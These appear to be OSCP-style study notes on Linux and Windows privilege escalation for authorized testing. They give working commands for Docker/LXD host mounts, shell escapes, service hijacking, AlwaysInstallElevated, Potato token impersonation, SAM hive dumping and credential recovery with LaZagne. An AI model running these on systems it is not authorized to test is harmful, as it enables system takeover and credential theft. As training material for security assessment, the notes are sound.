Rootful Docker daemon with an available image ```bash docker images docker run --rm -it -v /:/host IMAGE chroot /host /bin/sh ``` > Requires daemon/socket access, a rootful daemon, usable image and allowed host bind mount. Rootless mode, user namespaces, authorization plugins and SELinux can change the effect.
LXD/LXC with an available image alias ```bash lxc image list lxc init IMAGE_ALIAS privesc -c security.privileged=true lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true lxc start privesc lxc exec privesc /bin/sh ``` > Requires configured daemon access, sufficient group rights, image availability and privileged-container/device support.
## 11. Mounts, NFS and local services ```bash findmnt cat /etc/fstab mount ss -lntup ss -lxnp ``` For NFS, a writable export plus `no_root_squash` can trust client-root-created ownership/SUID metadata. Confirm export options, writable mount, target-side mount options and compatible execution. See [NFS/RPC](../02-service-enumeration/05-nfs-rpc.md). Root-only loopback services and UNIX sockets are candidates only. Identify protocol/authentication and prove a privileged action through a controlled request, configuration, plugin or file. ## 12. Shared-library resolution ```bash file /PATH/TO/BINARY readelf -d /PATH/TO/BINARY 2>/dev/null | grep -E 'RPATH|RUNPATH|NEEDED' ldd /PATH/TO/BINARY 2>/dev/null ``` > Need a privileged dynamically linked consumer plus a missing/selected library resolved from a writable location or a preserved loader variable. Secure-execution mode strips many loader variables from SUID/SGID programs. Prefer `readelf` over executing an untrusted file through an unsafe `ldd` implementation. For root-run scripts, inspect imports/includes and their actual search order. A writable current directory, module path or imported file can be a privileged input even when the main script is protected: ```bash grep -nE '^(import|from) |require\(|include|source |\. ' /PATH/TO/SCRIPT /PATH/TO/python3 -c 'import sys; print("\n".join(sys.path))' ``` > Prove the privileged interpreter uses the writable module/include before changing it. The interactive interpreter's search path may differ from cron/systemd/sudo. ## 13. Software/kernel exploits: evidence last ```bash uname -a cat /proc/version cat /etc/os-release dpkg -l 2>/dev/null rpm -qa 2>/dev/null sudo --version lsmod sysctl kernel.unprivileged_userns_clone 2>/dev/null ``` ```bash searchsploit "PRODUCT VERSION local privilege escalation" searchsploit -x EDB_ID searchsploit -m EDB_ID gcc -Wall -Wextra exploit.c -o exploit file exploit sha256sum exploit ``` > Match component, exact distribution/build and patch/backport state, architecture, required configuration/capabilities/namespaces, mitigations and dependencies. Review source and recovery risk. A version title or successful compilation is only a candidate. Follow [public exploit adaptation](../03-initial-access/06-public-exploit-adaptation.md). ## 14. Automated enumeration: generate, then prove For the early collector pass, transfer a reviewed LinPEAS copy, check the current UID/architecture and save its output. This form does not require an executable bit: ```bash sh ./linpeas.sh | tee linpeas.txt ``` Follow the named finding into the matching sudo, SUID/capability, writable-consumer or credential procedure. Use the local help for optional modes; broader/noisier checks are not the automatic baseline. ```bash ./linpeas.sh | tee linpeas.txt ./lse.sh | tee lse.txt ./lse.sh -l1 | tee lse-l1.txt ./unix-privesc-check standard > unix-privesc-check.txt ``` > LinPEAS optional flags vary by build. Read the local `./linpeas.sh -h` before selecting broader checks; they are not the automatic baseline. LSE progresses from default to `-l1`, then `-l2` only if needed. `unix-privesc-check detailed` is slower and more false-positive-prone. For every highlight: ```text exact object | effective permission | privileged consumer | identity | trigger | expected effect | manual verification ``` Do not pipe an unverified Internet download into the target shell. Acquire a trusted copy, retain its source/hash, transfer deliberately and remove assessment artifacts when appropriate. ## 15. Failure router | Symptom | Check next | | --- | --- | | `sudo -l` fails/prompts | Password requirement, credential correctness and policy—not “no sudo” | | Allowed sudo command gives ordinary shell | Args/run-as, privilege dropping, `NOEXEC`, MAC denial | | SUID technique stays low privilege | Owner/mode, effective UID, `nosuid`, shell privilege preservation | | Capability command fails | Exact path, `+ep`, bounding set, namespace/mount and interpreter support | | Cron edit never runs | Job/user/schedule, working directory, shell/PATH, logs and pspy | | PATH route ignored | Absolute command, `secure_path`, reset environment, wrong directory/order | | Wildcard route ignored | Working directory, expansion, option order and utility implementation | | Docker permission denied | Socket ACL, group session, daemon mode and authorization controls | | Kernel PoC fails | Exact affected build/configuration, architecture, toolchain/dependencies | | Enumerator says “possible” | Run native commands proving every chain link | ## 16. Verify and re-enumerate ```bash id; whoami; groups hostname; pwd ip addr; ip route ``` After root, re-enumerate newly readable credentials, services, listeners, mounts and routes. Capture the exact command, decisive output and state transition required by the objective; keep target details and proof material private. ## Restricted shell — escape the restriction without claiming root Use when a login is confined by rbash or an allowlisted command wrapper. Check which binaries and features are actually allowed; the following are alternatives, not a sequence to execute together. ```bash # If the allowed Python interpreter can create a child shell python3 -c 'import os; os.execl("/bin/sh", "sh")' # If an unrestricted awk is in the allowed path awk 'BEGIN {system("/bin/sh")}' # If less allows its shell-escape feature: run less FILE, then enter this in less !/bin/sh ``` Read: run `id` and check the new shell behavior. This changes the command environment, not the UID. LESSSECURE, a restricted editor build, no-exec controls or an application wrapper can block an otherwise familiar GTFOBins escape. A server-side SSH ForceCommand can ignore the command you supply to ssh; do not repeat a client-side command substitution as though it overrides the server policy. Sources: [upstream 1](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html) · [upstream 2](https://gtfobins.github.io/). ## Kernel candidates — Linux Exploit Suggester as a second view Use when manual permission/credential routes have not yielded a candidate and kernel/package evidence justifies checking public local exploits. Transfer a reviewed copy before execution. ```bash uname -a cat /etc/os-release bash linux-exploit-suggester.sh ``` Read: candidates need the advisory's exact kernel/build/configuration and prerequisite checks. Distribution backports can fix a CVE without changing an apparent upstream version. Inspect the PoC's primitive, architecture, compilation and failure impact before choosing it. A suggestion or successful build is not evidence of a vulnerable target or an elevated identity. Sources: [upstream 1](https://github.com/The-Z-Labs/linux-exploit-suggester). ## Logrotate race — only with a controlled log path and privileged rotation Use when root rotates a log in an attacker-controlled path and the configuration creates/copies/compresses a file. A writable log by itself is insufficient. Check the relevant stanza, directory ownership and actual scheduled execution first. ```bash cat /etc/logrotate.conf cat /etc/logrotate.d/SERVICE namei -l /PATH/TO/LOG systemctl cat logrotate.service logrotate.timer # Compile a reviewed upstream source; prepare a script payload for the actual consumer gcc -o logrotten logrotten.c printf '%s\n' 'id > /tmp/logrotate-proof.txt' > payloadfile # create option; wait for the existing privileged rotation trigger ./logrotten -p ./payloadfile /PATH/TO/LOG # Alternative for a matching compress configuration, not an extra required step ./logrotten -p ./payloadfile -c -s 4 /PATH/TO/LOG ``` Read: winning the file-write race and executing its contents are separate events. The upstream default targets a shell-completion consumer: it must actually be sourced by a privileged shell before the proof appears. Verify that consumer and then read the proof UID. A low-privilege `su` rotation, protected parent, incompatible build/filesystem or an absent consumer can rule out this route. Do not force root rotation from a low-privilege account or treat lack of proof as a confirmed race win; return to the scheduled-job/service checks. Sources: [upstream 1](https://github.com/whotwagner/logrotten) · [upstream 2](https://codeberg.org/whotwagner/logrotten). ## Sources - Supplied PEN-200 Ch 18, pp550-582 - [Current OSCP+ Body of Knowledge](https://help.offsec.com/hc/en-us/articles/38543335188756-OSCP-Body-of-knowledge) - [Current OSCP+ exam guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) - [getSH Privilege Escalation: Linux](https://lizajose.github.io/getSH/privesc?system=linux), source snapshot [`e1f62dd`](https://github.com/lizajose/getSH/commit/e1f62dd351bd061b59e2573beea741f6c5bb4f98) - [Hexdump PATH hijacking module](https://github.com/LeonardoE95/OSCP/tree/main/modules/linux/PATH-hijacking) - [sudoers manual](https://www.sudo.ws/docs/man/sudoers.man/) - [Linux capabilities manual](https://man7.org/linux/man-pages/man7/capabilities.7.html) - [systemctl manual](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html) - [Docker run reference](https://docs.docker.com/reference/cli/docker/container/run/) and [Docker Linux post-install security](https://docs.docker.com/engine/install/linux-postinstall/) - [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS), [LSE](https://github.com/diego-treitos/linux-smart-enumeration), [pspy](https://github.com/DominicBreuker/pspy) and [GTFOBins](https://gtfobins.github.io/)

# Windows Privilege Escalation [← Stage index](README.md) | [Quick sheet](../../cheatsheets/windows-privesc.md) | [Credential use](../04-shells-transfers-credentials/03-credential-use-and-cracking.md) | [File transfer](../04-shells-transfers-credentials/01-file-transfer.md) | [Strategy map](../../notes/Attack_Strategy_Map.md) | Study methods: [Escalate privileges on Windows](../../notes/methods/windows-privesc.md) > **Entry:** authorized Windows shell. **Exit:** verified Administrator/high-integrity or SYSTEM process. **Proof chain:** current token → controlled input → effective right → privileged consumer → run-as identity → trigger → verified effect. > **First pass:** check whoami /all and architecture, then run the reviewed winPEAS baseline in the [collector section](#11-automated-candidate-generation). Read out.txt and follow the exact service/task, token or credential finding; use native checks if the collector is unavailable. ## 1. Establish token and host state ```cmd hostname whoami /all systeminfo ipconfig /all route print netstat -ano tasklist /svc query user net user net localgroup Administrators driverquery /v ``` ```powershell Get-ComputerInfo | Select-Object WindowsProductName,WindowsVersion,OsBuildNumber,OsArchitecture Get-HotFix | Sort-Object InstalledOn -Descending Get-CimInstance Win32_Process | Select-Object ProcessId,Name,ExecutablePath,CommandLine Get-CimInstance Win32_Service | Select-Object Name,StartName,State,StartMode,PathName Get-CimInstance Win32_SystemDriver | Select-Object Name,State,StartMode,PathName Get-LocalUser Get-LocalGroupMember Administrators ``` > **Interpret:** record user SID, integrity label, enabled/deny-only groups and present/enabled privileges. Administrator membership with Medium integrity is a filtered token, not a high-integrity process. `Get-HotFix` does not list every update; use build/KB output only to form a version hypothesis.
WMIC compatibility fallbacks ```cmd wmic qfe get HotFixID,InstalledOn wmic service get Name,StartName,State,StartMode,PathName wmic process get ProcessId,Name,ExecutablePath,CommandLine ``` > WMIC is deprecated and may be absent on newer systems; PowerShell CIM is the baseline.
## 2. Interpret effective access ```cmd icacls "C:\Path\To\OBJECT" sc.exe sdshow SERVICE accesschk.exe -accepteula -nobanner -v -w "USER" "C:\Path\To\OBJECT" accesschk.exe -accepteula -nobanner -v -w -c "USER" SERVICE ``` `icacls` common rights: `F` full, `M` modify, `RX` read/execute, `R` read, `W` write, `D` delete. Common inheritance markers: `I`, `OI`, `CI`, `IO`, `NP`. > File, directory, registry, service-object, task and process permissions are separate. Check whether the ACE applies to the current user or an enabled group and grants the exact required operation. Mandatory Integrity Control can still block a lower-integrity write. ## 3. Hunt credentials and configuration ### Stored credentials and PowerShell trails ```cmd cmdkey /list vaultcmd /list vaultcmd /listcreds:"Windows Credentials" /all ``` ```powershell $history = (Get-PSReadLineOption).HistorySavePath $history Get-Content -LiteralPath $history -ErrorAction SilentlyContinue Get-ItemProperty 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription' -ErrorAction SilentlyContinue Get-ItemProperty 'HKCU:\Software\Policies\Microsoft\Windows\PowerShell\Transcription' -ErrorAction SilentlyContinue Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -ErrorAction SilentlyContinue | Where-Object Id -in 4103,4104 | Select-Object -First 50 TimeCreated,Id,Message ``` > A `cmdkey` entry is target/context-bound and does not reveal a password. DPAPI-protected data needs the protecting user/machine context and keys. `Clear-History` does not necessarily clear PSReadLine's saved file.
Targeted application/file/registry search ```cmd reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s dir /s /b C:\Windows\Panther\*unattend*.xml C:\Windows\System32\Sysprep\*.xml 2>nul dir /s /b C:\Users\*.kdbx C:\Users\*.rdp C:\Users\id_rsa C:\Users\*.ppk 2>nul ``` ```powershell Get-ChildItem C:\inetpub,C:\ProgramData,C:\Users -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Extension -in '.config','.xml','.ini','.txt','.ps1','.bat','.cmd','.yml','.yaml','.json' } | Select-String -Pattern 'password|passwd|secret|token|connectionString|user id=' -CaseSensitive:$false ``` > Search from observed applications first. Classify every value by identity, format, scope and compatible service, then use the credential procedure.
Saved credential consumer ```cmd runas /savecred /user:DOMAIN\USER cmd.exe ``` > Use only when `cmdkey`/context supports that identity and logon type. `runas` does not inherently bypass UAC; verify the resulting token with `whoami /all`.
LaZagne — recover application credentials in the current user's context Use a reviewed Windows build after identifying the current user and installed applications. Start with the relevant family; run broader collection only when useful. User-protected stores depend on that user's profile/decryption context; system-protected stores can need an elevated token. ```cmd REM Browser-store leads for the current user laZagne.exe browsers REM Broader recovery, with a local text report laZagne.exe all -oN ``` > **Read:** preserve the reported application/account/source with each recovered value. Test a matching service using the credential procedure; a recovered application password is not automatically a domain password. Empty output can mean no supported store, inaccessible profile or failed decryption. Follow manual history/config/vault checks instead of assuming there are no credentials. [LaZagne upstream](https://github.com/AlessandroZ/LaZagne).
## 4. Service control and executed objects ### Inventory and inspect ```powershell Get-CimInstance Win32_Service | Select-Object Name,StartName,State,StartMode,PathName ``` ```cmd sc.exe qc SERVICE sc.exe sdshow SERVICE icacls "C:\Path\To\service.exe" icacls "C:\Path\To" accesschk.exe -accepteula -nobanner -v -w -c "USER" SERVICE accesschk.exe -accepteula -nobanner -v -w "USER" "C:\Path\To\service.exe" ``` > **Need:** control of service config, exact binary/script, searched prefix, DLL/config/plugin, or relevant DACL; higher `SERVICE_START_NAME`; and a start/restart/boot trigger. In PowerShell use `sc.exe`, because bare `sc` can resolve to `Set-Content`. ### Modifiable service configuration Preserve `BINARY_PATH_NAME`, account and start mode first: ```cmd sc.exe qc SERVICE sc.exe config SERVICE binPath= "C:\Windows\Temp\PAYLOAD_EXE" sc.exe stop SERVICE sc.exe start SERVICE ``` Restore: ```cmd sc.exe config SERVICE binPath= "ORIGINAL_BINARY_PATH" ``` > `SERVICE_CHANGE_CONFIG` controls `binPath`; start/stop are separate rights. The space after `binPath=` is required. Error 1053 may mean a non-service payload ran but did not answer the Service Control Manager; verify the intended effect.
Writable service binary or replaceable parent ```cmd sc.exe qc SERVICE icacls "C:\Path\To\service.exe" icacls "C:\Path\To" copy /Y "C:\Path\To\service.exe" "C:\Windows\Temp\service.exe.backup" copy /Y "C:\Windows\Temp\PAYLOAD_EXE" "C:\Path\To\service.exe" sc.exe stop SERVICE sc.exe start SERVICE ``` > A parent with delete/create rights can permit replacement even when the file is not directly writable. Confirm architecture, file locks, recovery copy and exact trigger.
## 5. Unquoted service paths ```powershell Get-CimInstance Win32_Service | Where-Object { $_.PathName -match '\s' -and $_.PathName -notmatch '^\s*"' } | Select-Object Name,StartName,State,StartMode,PathName ``` For `C:\Program Files\Vendor App\service.exe -d`, check every attempted prefix: ```cmd icacls C:\ icacls "C:\Program Files" icacls "C:\Program Files\Vendor App" sc.exe qc SERVICE ``` > **Confirmed only if:** path contains spaces and is unquoted; an earlier attempted executable such as `C:\Program.exe` or `C:\Program Files\Vendor.exe` is absent and creatable; service runs higher; trigger exists. A listed unquoted path alone is a false positive. ## 6. DLL/config/helper search hijacking Confirm: 1. exact DLL/helper/config name and architecture; 2. privileged process actually requests it; 3. selected attacker-writable location precedes the legitimate resolution; 4. payload preserves required exports/behavior where necessary; 5. reliable trigger exists. ```cmd icacls "C:\Path\To\Application" sc.exe qc SERVICE reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs" reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v SafeDllSearchMode ``` > Modern DLL resolution can apply redirection, API sets, side-by-side manifests, loaded modules, KnownDLLs, package dependencies and application-specific search flags before ordinary directories. Safe DLL search mode is enabled by default. In a suitable lab, Procmon filters for the process, `CreateFile`, `.dll`, and `NAME NOT FOUND` provide decisive runtime evidence; low-privilege remote use may be unavailable. ## 7. Scheduled tasks and autostarts ### Scheduled tasks ```cmd schtasks /query /fo LIST /v schtasks /query /tn "\FOLDER\TASK" /xml ``` ```powershell Get-ScheduledTask | ForEach-Object { $t = $_ [pscustomobject]@{ TaskPath=$t.TaskPath; TaskName=$t.TaskName UserId=$t.Principal.UserId; RunLevel=$t.Principal.RunLevel Actions=($t.Actions | ForEach-Object { "$($_.Execute) $($_.Arguments) [wd=$($_.WorkingDirectory)]" }) -join '; ' } } ``` ```cmd icacls "C:\Path\To\task-script.ps1" icacls "C:\Path\To" schtasks /run /tn "\FOLDER\TASK" ``` > Prove action, arguments, working directory, principal, actual trigger and effective ACL. `RunLevel Highest` means the configured principal's highest available token, not SYSTEM. `/run` success means the request was accepted; verify process/effect and last-run result.
Run keys and startup consumers ```cmd reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" ``` > Need a modifiable consumed value/file plus a higher-privileged boot/logon/application trigger. A writable PATH directory matters only when a privileged consumer invokes an unqualified executable through that effective PATH.
## 8. AlwaysInstallElevated and UAC context ```cmd reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated ``` Both values must be `0x1`: ```cmd msiexec.exe /quiet /qn /i C:\Path\To\PAYLOAD.msi ``` > One key or a zero value disproves the route. This is an unsafe installer policy, not a universal UAC bypass. ```cmd whoami /groups reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin ``` > A UAC bypass normally elevates an already-administrative filtered token. Build/policy-specific bypasses are not a baseline path for a standard user. ## 9. Token privilege routes ```cmd whoami /priv ``` | Privilege | Required next proof | | --- | --- | | `SeImpersonatePrivilege` | Compatible privileged client/coercion, impersonation level, build/runtime/tool and process creation | | `SeAssignPrimaryTokenPrivilege` | Useful primary token plus process/quota requirements | | `SeBackupPrivilege` | Enabled privilege, backup-aware read and useful protected data | | `SeRestorePrivilege` | Restore-aware write plus privileged consumer/trigger | | `SeDebugPrivilege` | Usable target process and no protected-process barrier | | `SeLoadDriverPrivilege` | Compatible signed/loadable driver and stable exploit path | | `SeTakeOwnershipPrivilege` | Ownership change, then DACL/content control and consumer |
Impersonation-tool variants ```cmd PrintSpoofer64.exe -i -c "cmd.exe" ``` ```cmd GodPotato-NET4.exe -cmd "cmd.exe /c whoami > C:\Windows\Temp\token-proof.txt" ``` > Choose by OS build, architecture, runtime and available trigger. A privilege name alone does not select a working “Potato.” Success is a SYSTEM process/effect followed by `whoami /all`; connection/token/process errors route back to prerequisites.
Backup privilege to local credential material ```cmd reg save HKLM\SAM C:\Windows\Temp\SAM.hive reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive ``` ```bash impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL ``` > Use the matched hive pair. Output is local credential material, not automatic SYSTEM/domain/remote authorization; classify and validate it through the credential procedure.
## 10. Application, driver and kernel candidates ```powershell Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*', 'HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' -ErrorAction SilentlyContinue | Select-Object DisplayName,DisplayVersion,Publisher,InstallLocation ``` ```cmd systeminfo driverquery /v ``` > Prefer deterministic credential/permission/configuration paths. Then verify exact privileged application or driver version/configuration. Use kernel exploits last after exact build, architecture, cumulative update, mitigations, prerequisites, source and crash risk are checked. Avoid `Win32_Product`; it is slow and can trigger MSI repair. ## 11. Automated candidate generation ```cmd winPEASx64.exe log Seatbelt.exe -group=system -outputfile="C:\Windows\Temp\seatbelt-system.txt" Seatbelt.exe -group=user -q -outputfile="C:\Windows\Temp\seatbelt-user.json" ``` ```powershell powershell.exe -ExecutionPolicy Bypass -Command ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Report TXT,HTML" Import-Module .\PowerUp.ps1 Invoke-AllChecks ``` > winPEAS is broad; Seatbelt is a targeted survey and publishes source rather than official binaries; PrivescCheck evaluates the current token and skips some checks when elevated; PowerUp is useful but its upstream repository was archived. AV/script-policy failure is a tooling limitation—use native checks. Convert every highlight into: ```text CANDIDATE | CURRENT TOKEN | CONTROLLED INPUT | EFFECTIVE RIGHT | CONSUMER | RUN-AS | TRIGGER | EXPECTED EFFECT | STATUS ``` ## 12. Failure router | Failure | Next action | | --- | --- | | Service config `Access is denied` | Validate service DACL/effective token; inspect binary/DLL/config alternatives | | Can modify but cannot restart | Find reliable boot/logon/service dependency trigger or choose another path | | Service error 1053 | Check bounded effect, then restore; payload may not implement the service protocol | | Unquoted path but no creatable prefix | Disprove the route | | DLL not loaded | Recheck actual request, KnownDLL/SxS/loaded module, search order, bitness and trigger | | Task accepted but no effect | Check action, conditions, working directory, LastTaskResult/history and process lifetime | | Privilege tool fails | Recheck enabled token state, build, architecture/runtime and trigger-specific prerequisite | | Hashes but no higher session | Return to credential classification and host/service authorization | | Suggester lists CVE | Verify exact component/build/patch/config and exploit source before use | | Enumerator blocked | Run the relevant native branch; do not infer no findings | ## 13. Verify, re-enumerate and preserve evidence ```cmd whoami /all hostname ipconfig /all ``` After a higher token, re-enumerate protected credentials, services, tasks, sessions, listeners, routes and domain context. Preserve the command, relevant output, trigger and restoration step. For exam use, recheck the current OffSec guide: Windows full-privilege evidence requires SYSTEM, Administrator or an account with Administrator privileges, and AI/LLM use is prohibited during the exam and report phase. ## JAWS — PowerShell enumeration when the compiled helper is unsuitable Use a reviewed JAWS script when its PowerShell-based checks fit the current host/runtime. It is an alternative survey, not proof that every current Windows configuration is covered. ```cmd powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt ``` Read: turn a named service, path or credential finding into its exact native check (`sc.exe qc`, `sc.exe sdshow`, `icacls`, task XML, or the file read). Policy or language restrictions can still prevent the script from running. The process-scope flag does not override an enforced policy/control layer; use the manual checks already listed here. Sources: [upstream 1](https://github.com/411Hall/JAWS). ## Legacy impersonation helpers — select by OS build and trigger Use the current GodPotato/PrintSpoofer workflow first when its conditions fit. Older JuicyPotato-family recipes depend on specific COM/DCOM/RPC behavior; an enabled token privilege alone is not the complete condition. ```cmd REM Legacy JuicyPotato: requires a working CLSID and supported Windows build JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -c CLSID -a "/c whoami > C:\Windows\Temp\identity-check.txt" REM Separate EFS-triggered helper, if its documented prerequisites fit SharpEfsPotato.exe -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\Windows\Temp\identity-check.txt" type C:\Windows\Temp\identity-check.txt ``` Read: verify the exact resulting token/identity and effect. CLSID/RPC/trigger errors can mean an incompatible build, service state or blocked primitive—not a wrong password. Original JuicyPotato is a legacy option and is not a universal modern-Windows escalation. Inspect each helper's local help/version; do not interchange flags across JuicyPotatoNG, GodPotato and SharpEfsPotato. Sources: [upstream 1](https://github.com/ohpe/juicy-potato) · [upstream 2](https://github.com/bugch3ck/SharpEfsPotato). ## AccessChk — verify the exact service, file or registry permission Use after WinPEAS, PrivescCheck or a manual check identifies a candidate. Query the current identity and the exact object; a writable service binary and service-configuration rights are different paths. ```cmd whoami accesschk.exe -nobanner -v -c "DOMAIN\USER" SERVICE accesschk.exe -nobanner -v "DOMAIN\USER" "C:\Path\To\PROGRAM.exe" accesschk.exe -nobanner -v -k "DOMAIN\USER" "HKLM\SYSTEM\CurrentControlSet\Services\SERVICE" :: Broader candidate discovery; retain errors rather than suppressing them accesschk.exe -nobanner -w -v -c "DOMAIN\USER" * ``` Read: `SERVICE_CHANGE_CONFIG`, `WRITE_DAC`, file modification and registry value modification enable different operations. Next inspect `sc.exe qc SERVICE`, executable/parent ACLs, service identity and a permitted restart/trigger. A write result alone does not establish SYSTEM execution. Empty write-filtered output is not a complete permission inventory; inspect the exact object without `-w` and check errors. Use the existing `sc.exe sdshow`, `icacls` and PowerShell ACL checks if AccessChk is unavailable. Sources: [upstream 1](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk). ## Sources - Supplied PEN-200, Chapter 17, pp494-549 - [OffSec OSCP+ Body of Knowledge](https://help.offsec.com/hc/en-us/articles/38543335188756-OSCP-Body-of-knowledge) - [OffSec OSCP+ Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) - [getSH Windows privilege escalation](https://lizajose.github.io/getSH/privesc?system=windows), source snapshot [`e1f62dd`](https://github.com/lizajose/getSH/commit/e1f62dd351bd061b59e2573beea741f6c5bb4f98) - [Hexdump Windows module](https://github.com/LeonardoE95/OSCP/tree/main/modules/windows) - [Microsoft access tokens](https://learn.microsoft.com/windows/win32/secauthz/access-tokens) - [Microsoft Mandatory Integrity Control](https://learn.microsoft.com/windows/win32/secauthz/mandatory-integrity-control) - [Microsoft service security and access rights](https://learn.microsoft.com/windows/win32/services/service-security-and-access-rights) - [Microsoft DLL search order](https://learn.microsoft.com/windows/win32/dlls/dynamic-link-library-search-order) - [Microsoft AlwaysInstallElevated policy](https://learn.microsoft.com/windows/client-management/mdm/policy-csp-applicationmanagement#msialwaysinstallwithelevatedprivileges) - [Microsoft AccessChk](https://learn.microsoft.com/sysinternals/downloads/accesschk) - [PrivescCheck](https://github.com/itm4n/PrivescCheck), [Seatbelt](https://github.com/GhostPack/Seatbelt), [PEASS-ng](https://github.com/peass-ng/PEASS-ng) - [PrintSpoofer research](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/), [GodPotato](https://github.com/BeichenDream/GodPotato)
